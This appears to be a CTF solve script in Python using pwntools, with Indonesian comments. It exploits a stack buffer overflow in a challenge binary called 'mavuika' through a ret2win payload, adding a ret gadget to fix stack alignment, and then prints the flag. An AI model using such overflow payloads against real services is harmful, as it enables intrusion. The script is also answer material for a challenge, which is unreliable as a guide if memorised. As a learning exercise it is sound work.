#!/usr/bin/env python3
from pwn import *

context.binary = exe = ELF("./bin/mavuika", checksec=False)
context.arch = "amd64"

if args.REMOTE:
    io = remote(args.HOST or "127.0.0.1", int(args.PORT or 40101))
else:
    io = process(["./bin/mavuika"])

win_addr = exe.symbols["win"]  # no PIE -> statis, dibaca dari attachment binary, tidak di-leak program
log.info(f"win address (dari binary, no PIE): {hex(win_addr)}")

OFFSET = 72  # buf[64] (rbp-0x40) + saved RBP (8 byte), dicek via objdump

# PENTING (ditemukan saat testing lawan container Ubuntu 22.04, bukan cuma lokal):
# ret2win LANGSUNG ke win() bikin RSP di win() misaligned 8 byte dari yang
# diharapkan ABI x86-64 (call normal mendorong return addr dulu, ret2win tidak),
# dan win() memanggil fopen() -> malloc() -> _int_malloc() yang pakai instruksi
# SSE (movaps) yang WAJIB 16-byte aligned -> #GP -> SIGSEGV, flaky antar
# versi glibc. Fix standar: sisipkan 1 gadget "ret" polos dulu supaya RSP
# bergeser 8 byte ekstra sebelum masuk win().
ret_gadget = next(exe.search(asm("ret"), executable=True))
payload = b"A" * OFFSET + p64(ret_gadget) + p64(win_addr)

io.recvuntil(b"masukkan input: ")
io.sendline(payload)

flag = io.recvline_contains(b"TecFest26").strip()
print(flag.decode())
io.close()
